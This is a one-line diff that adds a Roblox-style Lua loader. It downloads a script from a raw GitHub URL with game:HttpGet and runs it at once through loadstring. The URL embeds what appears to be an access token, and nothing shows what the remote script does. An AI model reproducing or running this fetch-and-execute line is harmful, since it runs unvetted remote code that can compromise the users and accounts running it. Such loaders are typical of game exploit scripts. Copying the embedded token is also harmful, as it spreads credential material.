@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Moonka727/invent/refs/heads/main/script.lua?token=GHSAT0AAAAAADAFDQUWLD7NXONPEBV4UYNKZ7I4JEA"))()
